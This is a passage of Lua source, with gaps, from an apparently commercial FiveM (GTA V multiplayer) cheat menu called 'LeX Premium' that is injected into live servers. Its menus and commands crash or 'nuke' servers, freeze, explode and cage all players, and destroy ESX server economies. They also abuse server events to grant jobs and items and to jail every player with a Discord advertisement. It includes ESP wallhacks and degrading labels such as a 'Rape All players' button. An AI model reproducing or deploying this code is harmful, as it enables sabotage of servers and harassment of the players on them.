	e.CheckBox("~h~~r~_LeX_ ~s~Handcuff everyone", handpe, function(Pekinez) handpe = Pekinez end) then elseif e.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif e.Button("~h~~r~Rocket~s~ All players") then cE() elseif e.Button("~h~~r~Rape~s~ All players", "~r~WARNING") then RapeAllFunc() elseif e.Button("~h~~r~Cage~s~ All players") then cG() elseif e.Button("~h~~r~'BORGAR'~s~ All players") then cA() elseif e.Button("~h~~o~_!_ ~r~CRASH~s~ Everyone~o~ _!_", "~r~WARNING") then cv() elseif e.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(eC) freezeall = eC end) then elseif e.CheckBox("~h~~r~Explode~s~ All players", blowall, function(eC) blowall = eC end) then end;
    e.Display() elseif e.IsMenuOpened(bY) then cr("", 0.58, 0.58) if e.Button("~h~~r~Nuke ~s~Server") then nukeserver() elseif e.CheckBox("~h~~r~_LeX_~s~Fuck The Banks ~g~(ESX)", minus, function(Pekinez) minus = Pekinez end) then elseif e.CheckBox("~h~~r~Delay ~s~/ ~o~Crasher", servercrasherxd, function(eC) servercrasherxd = eC end) then elseif e.Button("~h~~g~ESX ~r~Destroy ~b~v2") then esxdestroyv2() elseif e.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then EconomyDy2() elseif e.Button("~h~~r~Rampinator~s~ LOL") then
	...
	e.Display() elseif e.IsMenuOpened(cosh) then a5("Enjoy", 1.0, 1.295) if  e.Button("~h~Custom Job") then
        local reason = KeyboardInput("Enter the job name | Example : police ,gang ,mafia ,mecano                                                              ", "", 100)
        local reason2 = KeyboardInput("Enter the level job number 0/10 | Example : 6                                                      ", "", 10)
        if reason and reason2 then
        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(-1), reason, reason2)
        TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(-1), reason, reason2)
        TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(-1), reason, reason2)
        end
       end;

    e.Display() elseif e.IsMenuOpened(item) then a5("Enjoy", 1.0, 1.295) if e.Button("~h~~r~Give Bread ~b~x10") then hampek() 
    elseif e.Button("~h~~y~Give Phone ~b~x1") then phopek() elseif e.Button("~h~~o~Give Hamburger ~b~x10") then hambpek() elseif e.Button("~h~~g~Give Water ~b~x10") then colpek() elseif e.Button("~h~~p~Give Repair Kit ~b~x10") then fixpek()
    elseif e.Button("~h~~r~Give Medkit ~b~x10") then medpek() elseif e.Button("~h~~y~Give Bank Drill ~b~x10") then hanpek()
    end 


    e.Display() elseif e.IsMenuOpened(b_) then cr("", 0.29, 0.29) if e.Button("~h~~p~#~s~ Pekinez~r~#~r~9362 ~p~DEV") then aM("~h~~o~STOP ~s~.", false) aM("~h~~o~thank you for your purchase  :3~s~.", false) aM("~h~~o~STOP~s~.", false) elseif e.Button("~h~~p~#~s~ LeX~r~#~r~1669 ~p~DEV") then elseif e.Button("~h~~s~↓↓↓↓↓~r~(Desudo DEV)~s~↓↓↓↓↓") then elseif e.Button("~h~~u~>~s~ Melon~r~#~r~1249 ~p~My Hero") then end; e.Display() elseif e.IsMenuOpened(cq) then cr("", 0.58, 0.58) for eJ, eZ in pairs(bo) do
        if e.MenuButton("~h~~p~#~s~ "..eJ, cp) then ek = eZ end end; e.Display() elseif e.IsMenuOpened(cp) then
    ...
    for _, eZ in pairs(em) do
        if e.
    Button(eZ.name) then GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(el.id), GetHashKey(eZ.id)) end end; e.Display() elseif e.IsMenuOpened(cm) then cr("", 0.58, 0.58) for i, f0 in ipairs(bk) do
        if e.
    ...
    if veh == nil then veh = "adder"
        ...
        Citizen.Wait(100) if f1 > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; e.Display() elseif e.IsMenuOpened(c2) then cr("", 0.58, 0.58) if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
    ...
    if veh == nil then veh = "adder"
        ...
        while not HasModelLoaded(vehiclehash) do f1 = f1 + 100;
        Citizen.Wait(100) if f1 > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) local f2 = GetVehiclePedIsUsing(GetPlayerPed(-1)) AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; e.Display() elseif e.IsMenuOpened(ch) then cr("", 0.58, 0.58) for i = 1, #bn do
        if e.	
    Button(bn[i]) then GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(bn[i]), 1000, false, true) end end;

    e.Display() elseif e.IsMenuOpened(anima) then cr("", 0.34, 0.34) if e.Button("~y~Rabbit 🐇") then
                                             ...
                                             RequestModel(GetHashKey(model)) 
                                              Wait(500)
                                               ...
                                               SetPlayerModel(PlayerId(), GetHashKey(model))
                                                   ...
                                                   elseif e.Button("~y~Yona/Pigeon 🐤") then
                                                ...
                                                elseif e.Button("~y~Hammerhead Shark 🦈") then
                                                ...
                                                elseif e.Button("~y~Chicken 🐔") then
                                                    local model = "a_c_hen"
                                                     RequestModel(GetHashKey(model)) 
                                                    Wait(500)
                                                  if HasModelLoaded(GetHashKey(model)) then
	...
	e.Display() elseif e.IsMenuOpened(cz) then cr("", 0.34, 0.34) if e.MenuButton("~h~~r~-» ~y~Animal Ped Menu 🐕‍🦺", anima) then elseif e.Button("~h~~r~_LeX_ ~s~Change Clothes ~g~(ESX)") then
    TriggerEvent('esx_skin:openSaveableMenu') 
    elseif e.Button("~r~~h~Clown") then
    ...
    elseif e.Button("~o~~h~Stripper") then
        local model = "s_f_y_stripper_01"
            ...
            elseif e.Button("~y~~h~Babyd") then
                local model = "u_m_y_babyd"
                    ...
                    elseif e.Button("~g~~h~Pervert") then
                    ...
                    elseif e.Button("~o~~h~Cop") then
                        local model = "s_m_y_cop_01"
                            ...
                            if HasModelLoaded(GetHashKey(model)) then
                                ...
                                elseif e.Button("~y~~h~Monkey") then
                        local model = "a_c_chimp"
                            ...
                            elseif e.Button("~g~~h~Trangender") then
                                local model = "a_m_m_tranvest_01"
                                    ...
                                    elseif e.Button("~b~~h~Jesus") then
            ...
            elseif e.Button("~r~~h~Randomize Clothing") then
	...
	e.Display() elseif e.IsMenuOpened(c5) then cr("", 0.34, 0.34) if e.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(eC) esp = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Box", espbox, function(eC) espbox = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(eC) espinfo = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(eC) esplines = eC end) then end; e.Display() elseif e.IsMenuOpened(c4) then cr("", 0.46, 0.46) local veh = GetVehiclePedIsUsing(PlayerPedId()) if e.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", cg) then elseif e.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", cf) then elseif e.Button("~h~Change Car License Plate") then da() elseif e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(eC) RainbowVeh = eC end) then elseif e.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(eC) rainbowh = eC end) then end; e.Display() elseif e.IsMenuOpened(cd) then cr("", 0.46, 0.46) if e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(eC) t2x = eC; t4x = false; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(eC) t2x = false; t4x = eC; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(eC) t2x = false; t4x = false; t10x = eC; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(eC) t2x = false; t4x = false; t10x = false; t16x = eC; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = eC; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = false; tbxd = eC end) then end; e.Display() end; Citizen.Wait(0) end end) RegisterCommand("chocolate", function(f3, f4, f5) ao() print("^1"..
    "LeX Premium injected successfully!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false) 
